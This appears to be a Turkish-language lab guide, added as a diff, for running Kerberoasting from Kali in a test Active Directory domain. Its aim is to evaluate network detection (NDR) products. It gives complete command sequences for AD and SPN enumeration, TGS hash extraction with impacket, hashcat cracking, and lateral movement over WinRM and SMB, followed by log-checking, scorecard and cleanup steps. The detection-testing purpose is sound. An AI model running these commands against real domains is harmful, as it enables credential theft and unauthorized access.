@@ -1,0 +1,662 @@
+
+```text
+DC01:        10.10.10.10
+CLIENT01:    10.10.10.21
+CLIENT02:    10.10.10.22
+KALI:        10.10.10.50
+Domain FQDN: lab.local
+NetBIOS:     LAB
+Low user:    user_low / UserP@ss123!
+Roast user:  svc_sql / SqlP@ss123!
+```
+
+---
+
+# Kerberoasting Lab — Kali Üzerinden
+
+## 0. Amaç
+
+Kerberoasting, domain içinde **SPN atanmış servis hesapları** için TGS ticket talep edip bu ticket’ı offline crack etmeye dayanır.
+
+Bu labda zincir şu olacak:
+
+```text
+Kali → DC enumeration
+Kali → SPN’li servis hesabı tespiti
+DC üzerinde lab için svc_sql + SPN oluşturma
+Kali → TGS hash alma
+Kali → hashcat ile crack
+Kali → çıkan credential ile doğrulama
+Opsiyonel → svc_sql ile CLIENT02 erişim testi
+```
+
+---
+
+# 1. Kali hazırlığı
+
+**Makine: Kali**
+
+```bash
+sudo apt update
+sudo apt install -y python3-impacket netexec smbclient ldap-utils krb5-user hashcat wordlists
+```
+
+Lab değişkenlerini tanımla:
+
+```bash
+export DC_IP="10.10.10.10"
+export DOMAIN_FQDN="lab.local"
+export DOMAIN_NETBIOS="LAB"
+export USER="user_low"
+export PASS='UserP@ss123!'
+```
+
+DNS çözümlemesi için geçici ayar:
+
+```bash
+sudo bash -c "echo nameserver $DC_IP > /etc/resolv.conf"
+```
+
+Hosts dosyasına DC ekle:
+
+```bash
+sudo bash -c "cat >> /etc/hosts << EOF
+10.10.10.10 dc01.lab.local dc01
+10.10.10.21 client01.lab.local client01
+10.10.10.22 client02.lab.local client02
+EOF"
+```
+
+Kontrol:
+
+```bash
+nslookup lab.local
+nslookup dc01.lab.local
+ping -c 2 dc01.lab.local
+```
+
+Port kontrolü:
+
+```bash
+nc -vz $DC_IP 88
+nc -vz $DC_IP 389
+nc -vz $DC_IP 445
+```
+
+Beklenen:
+
+```text
+88/tcp   Kerberos
+389/tcp  LDAP
+445/tcp  SMB
+```
+
+---
+
+# 2. Enumeration Fazı — PowerView yok, Kali üzerinden
+
+## 2.1 Domain ve DC keşfi
+
+```bash
+nxc smb $DC_IP
+```
+
+Authenticated kontrol:
+
+```bash
+nxc smb $DC_IP -d $DOMAIN_NETBIOS -u $USER -p "$PASS"
+```
+
+Beklenen:
+
+```text
+[+] LAB\user_low:UserP@ss123!
+```
+
+Domain password policy:
+
+```bash
+nxc smb $DC_IP -d $DOMAIN_NETBIOS -u $USER -p "$PASS" --pass-pol
+```
+
+Bu NDR için SMB-authenticated enumeration üretir.
+
+---
+
+## 2.2 Kullanıcı enumeration
+
+```bash
+nxc smb $DC_IP -d $DOMAIN_NETBIOS -u $USER -p "$PASS" --users
+```
+
+Dosyaya almak için:
+
+```bash
+nxc smb $DC_IP -d $DOMAIN_NETBIOS -u $USER -p "$PASS" --users | tee users_enum.txt
+```
+
+Sadece kullanıcı listesi çıkarmak istersen:
+
+```bash
+nxc smb $DC_IP -d $DOMAIN_NETBIOS -u $USER -p "$PASS" --users | awk '{print $5}' | sort -u > users.txt
+cat users.txt
+```
+
+---
+
+## 2.3 Grup enumeration
+
+```bash
+nxc smb $DC_IP -d $DOMAIN_NETBIOS -u $USER -p "$PASS" --groups
+```
+
+Domain Admins üyeleri:
+
+```bash
+nxc smb $DC_IP -d $DOMAIN_NETBIOS -u $USER -p "$PASS" --groups | grep -i "Domain Admin"
+```
+
+---
+
+## 2.4 Bilgisayar enumeration
+
+```bash
+nxc smb $DC_IP -d $DOMAIN_NETBIOS -u $USER -p "$PASS" --computers
+```
+
+---
+
+## 2.5 SMB share enumeration
+
+```bash
+smbclient -L //$DC_IP -U "$DOMAIN_NETBIOS/$USER%$PASS"
+```
+
+NetExec ile:
+
+```bash
+nxc smb $DC_IP -d $DOMAIN_NETBIOS -u $USER -p "$PASS" --shares
+```
+
+SYSVOL erişimi:
+
+```bash
+smbclient //$DC_IP/SYSVOL -U "$DOMAIN_NETBIOS/$USER%$PASS"
+```
+
+`smbclient` içinde:
+
+```text
+ls
+recurse ON
+ls
+exit
+```
+
+---
+
+## 2.6 SPN enumeration — Kerberoasting için kritik adım
+
+Bu labın asıl enumeration adımı budur.
+
+```bash
+impacket-GetUserSPNs $DOMAIN_FQDN/$USER:"$PASS" -dc-ip $DC_IP
+```
+
+Beklenen çıktı örneği:
+
+```text
+ServicePrincipalName              Name       MemberOf  PasswordLastSet
+--------------------------------  ---------  --------  ----------------
+MSSQLSvc/client02.lab.local:1433  svc_sql              ...
+```
+
+Sadece SPN’li hesapları görmek için:
+
+```bash
+impacket-GetUserSPNs $DOMAIN_FQDN/$USER:"$PASS" -dc-ip $DC_IP | tee spn_enum.txt
+```
+
+**Bu adımda henüz hash istemiyoruz.** Sadece enumeration yapıyoruz.
+
+NDR tarafında beklenen:
+
+```text
+Kali → DC
+LDAP / Kerberos / SMB
+Authenticated AD enumeration
+SPN discovery
+```
+
+---
+
+# 3. Kerberoasting ön koşulu hazırlığı
+
+Bu adım labı kontrollü yapmak için. Gerçek ortamda bu zaten var olabilir.
+
+## 3.1 DC üzerinde servis hesabı oluştur
+
+**Makine: DC01**
+**PowerShell Admin**
+
+```powershell
+Import-Module ActiveDirectory
+```
+
+Servis hesabı oluştur:
+
+```powershell
+New-ADUser `
+  -Name "SQL Service" `
+  -SamAccountName "svc_sql" `
+  -UserPrincipalName "svc_sql@lab.local" `
+  -AccountPassword (ConvertTo-SecureString 'SqlP@ss123!' -AsPlainText -Force) `
+  -Enabled $true `
+  -PasswordNeverExpires $true
+```
+
+SPN ata:
+
+```powershell
+setspn -S MSSQLSvc/client02.lab.local:1433 LAB\svc_sql
+```
+
+Kontrol:
+
+```powershell
+setspn -L LAB\svc_sql
+```
+
+Beklenen:
+
+```text
+MSSQLSvc/client02.lab.local:1433
+```
+
+AD üzerinden kontrol:
+
+```powershell
+Get-ADUser svc_sql -Properties ServicePrincipalName |
+Select-Object SamAccountName, ServicePrincipalName
+```
+
+---
+
+## 3.2 Opsiyonel: svc_sql hesabını CLIENT02 local admin yap
+
+Bu Kerberoasting sonrası lateral movement testi için gerekli.
+
+**Makine: CLIENT02**
+**PowerShell Admin**
+
+```powershell
+net localgroup Administrators LAB\svc_sql /add
+```
+
+Kontrol:
+
+```powershell
+net localgroup Administrators
+```
+
+WinRM aç:
+
+```powershell
+Enable-PSRemoting -Force
+```
+
+Firewall kontrol:
+
+```powershell
+Get-NetFirewallRule -DisplayGroup "Windows Remote Management" |
+Select-Object DisplayName, Enabled
+```
+
+---
+
+# 4. Kerberoasting saldırı fazı
+
+## 4.1 Tüm SPN’li hesaplar için TGS hash iste
+
+**Makine: Kali**
+
+```bash
+impacket-GetUserSPNs $DOMAIN_FQDN/$USER:"$PASS" -dc-ip $DC_IP -request -outputfile kerberoast_hashes.txt
+```
+
+Dosyayı kontrol et:
+
+```bash
+cat kerberoast_hashes.txt
+```
+
+Beklenen format:
+
+```text
+$krb5tgs$23$*svc_sql$LAB.LOCAL$lab.local/svc_sql*$...
+```
+
+---
+
+## 4.2 Sadece svc_sql için targeted Kerberoasting
+
+Daha düşük gürültülü POC için tek hedefli test:
+
+```bash
+impacket-GetUserSPNs $DOMAIN_FQDN/$USER:"$PASS" -dc-ip $DC_IP -request-user svc_sql -outputfile kerberoast_svc_sql.txt
+```
+
+Kontrol:
+
+```bash
+cat kerberoast_svc_sql.txt
+```
+
+Bu POC için çok değerli çünkü NDR’a şu soruyu sorarsın:
+
+```text
+Çoklu SPN roast’u görüyor ama tek hedefli roast’u da görüyor mu?
+```
+
+---
+
+# 5. Hash crack fazı
+
+**Makine: Kali**
+
+Hashcat mode:
+
+```text
+13100 = Kerberos 5 TGS-REP etype 23
+```
+
+Lab wordlist oluştur:
+
+```bash
+cat > lab_words.txt << EOF
+Password123
+Password123!
+UserP@ss123!
+SqlP@ss123!
+Spring2025!
+Winter2024!
+EOF
+```
+
+Crack:
+
+```bash
+hashcat -m 13100 kerberoast_svc_sql.txt lab_words.txt
+```
+
+Sonucu göster:
+
+```bash
+hashcat -m 13100 kerberoast_svc_sql.txt --show
+```
+
+Beklenen:
+
+```text
+svc_sql:SqlP@ss123!
+```
+
+Eğer tüm hash dosyasını crack edeceksen:
+
+```bash
+hashcat -m 13100 kerberoast_hashes.txt lab_words.txt
+hashcat -m 13100 kerberoast_hashes.txt --show
+```
+
+---
+
+# 6. Credential doğrulama
+
+**Makine: Kali**
+
+SMB auth test:
+
+```bash
+nxc smb $DC_IP -d $DOMAIN_NETBIOS -u svc_sql -p 'SqlP@ss123!'
+```
+
+CLIENT02 üzerinde auth test:
+
+```bash
+nxc smb 10.10.10.22 -d $DOMAIN_NETBIOS -u svc_sql -p 'SqlP@ss123!'
+```
+
+Eğer svc_sql CLIENT02 local admin ise çıktı genellikle şöyle olur:
+
+```text
+[+] LAB\svc_sql:SqlP@ss123! (Pwn3d!)
+```
+
+WinRM kontrolü:
+
+```bash
+nxc winrm 10.10.10.22 -d $DOMAIN_NETBIOS -u svc_sql -p 'SqlP@ss123!'
+```
+
+Beklenen:
+
+```text
+[+] LAB\svc_sql:SqlP@ss123! (Pwn3d!)
+```
+
+Bu noktada Kerberoasting başarılıdır:
+
+```text
+1. SPN’li servis hesabı bulundu.
+2. TGS hash alındı.
+3. Offline crack edildi.
+4. Credential doğrulandı.
+5. Lateral movement için kullanılabilirliği test edildi.
+```
+
+---
+
+# 7. Opsiyonel lateral movement testi
+
+Bu adımı Kerberoasting zincirinin sonuna koyabilirsin.
+
+**Makine: Kali**
+
+WinRM ile komut çalıştırma:
+
+```bash
+nxc winrm 10.10.10.22 -d $DOMAIN_NETBIOS -u svc_sql -p 'SqlP@ss123!' -x "whoami && hostname"
+```
+
+PowerShell command:
+
+```bash
+nxc winrm 10.10.10.22 -d $DOMAIN_NETBIOS -u svc_sql -p 'SqlP@ss123!' -X "whoami; hostname; ipconfig"
+```
+
+SMB admin share erişimi:
+
+```bash
+smbclient //10.10.10.22/C$ -U "$DOMAIN_NETBIOS/svc_sql%SqlP@ss123!"
+```
+
+`smbclient` içinde:
+
+```text
+ls
+cd Users
+ls
+exit
+```
+
+NDR tarafında beklenen:
+
+```text
+Kali → CLIENT02
+SMB/445
+WinRM/5985
+East-west lateral movement
+Admin share access
+Remote command execution
+```
+
+---
+
+# 8. DC log kontrolü
+
+**Makine: DC01**
+
+Kerberoasting genelde Event ID **4769** üretir.
+
+```powershell
+Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4769; StartTime=(Get-Date).AddMinutes(-60)} |
+Select-Object TimeCreated, Id, Message
+```
+
+Sadece svc_sql için filtre:
+
+```powershell
+Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4769; StartTime=(Get-Date).AddMinutes(-60)} |
+Where-Object {$_.Message -match "svc_sql"} |
+Select-Object TimeCreated, Id, Message
+```
+
+Araman gereken alanlar:
+
+```text
+Account Name: user_low
+Service Name: MSSQLSvc/client02.lab.local:1433
+Client Address: Kali IP
+Ticket Encryption Type: 0x17
+```
+
+`0x17` RC4-HMAC anlamına gelir ve Kerberoasting açısından yüksek sinyaldir.
+
+---
+
+# 9. CLIENT02 log kontrolü
+
+Lateral movement yaptıysan CLIENT02 üzerinde:
+
+```powershell
+Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4624; StartTime=(Get-Date).AddMinutes(-60)} |
+Where-Object {$_.Message -match "svc_sql"} |
+Select-Object TimeCreated, Id, Message
+```
+
+Aranacak pattern:
+
+```text
+Logon Type: 3
+Account Name: svc_sql
+Source Network Address: Kali IP
+```
+
+WinRM kullandıysan:
+
+```powershell
+Get-WinEvent -LogName "Microsoft-Windows-WinRM/Operational" -MaxEvents 30
+```
+
+---
+
+# 10. NDR POC gözlem noktaları
+
+Vectra/Darktrace tarafında bu lab için beklenen zincir:
+
+```text
+1. Kali → DC
+   LDAP/SMB enumeration
+   Domain user / SPN enumeration
+
+2. Kali → DC
+   Kerberos/88
+   TGS-REQ
+   svc_sql için service ticket request
+
+3. Kali local
+   Offline cracking
+   Network sinyali yok
+
+4. Kali → DC / CLIENT02
+   svc_sql credential doğrulama
+   SMB/WinRM authentication
+
+5. Kali → CLIENT02
+   Lateral movement
+   Admin share / WinRM
+```
+
+Scorecard soruları:
+
+```text
+SPN enumeration davranışını gördü mü?
+Kerberoasting TGS requestlerini tespit etti mi?
+Tek hedefli svc_sql roast testini gördü mü?
+RC4 ticket request / etype 0x17 ayrımını gösterebildi mi?
+Crack sonrası credential kullanımını önceki roast ile bağladı mı?
+CLIENT02’ye lateral movement adımını zincire ekledi mi?
+Kaynak host doğru mu? Kali mi CLIENT01 mi?
+Hedef host doğru mu? DC mi CLIENT02 mi?
+User attribution doğru mu? user_low mu svc_sql mi?
+Time-to-detect kaç dakika?
+```
+
+---
+
+# 11. Cleanup
+
+**Makine: CLIENT02**
+
+```powershell
+net localgroup Administrators LAB\svc_sql /delete
+```
+
+**Makine: DC01**
+
+SPN sil:
+
+```powershell
+setspn -D MSSQLSvc/client02.lab.local:1433 LAB\svc_sql
+```
+
+Hesabı silmek istersen:
+
+```powershell
+Remove-ADUser svc_sql
+```
+
+Veya sadece devre dışı bırak:
+
+```powershell
+Disable-ADAccount svc_sql
+```
+
+**Makine: Kali**
+
+```bash
+rm -f kerberoast_hashes.txt kerberoast_svc_sql.txt lab_words.txt
+hashcat --remove -m 13100 kerberoast_svc_sql.txt lab_words.txt 2>/dev/null
+```
+
+Hashcat potfile temizlemek istersen dikkatli ol; tüm geçmiş crack sonuçlarını siler:
+
+```bash
+rm -f ~/.hashcat/hashcat.potfile
+```
+
+---
+
+# Bu labın final başarı kriteri
+
+```text
+[OK] Kali’den domain enumeration yapıldı.
+[OK] SPN’li svc_sql hesabı bulundu.
+[OK] svc_sql için TGS hash alındı.
+[OK] Hashcat ile parola kırıldı.
+[OK] svc_sql credential doğrulandı.
+[OK] Opsiyonel olarak CLIENT02’ye SMB/WinRM erişimi test edildi.
+[OK] DC’de 4769 eventleri görüldü.
+[OK] NDR’da Kerberos TGS request ve sonraki credential use/lateral movement değerlendirildi.
+```
+
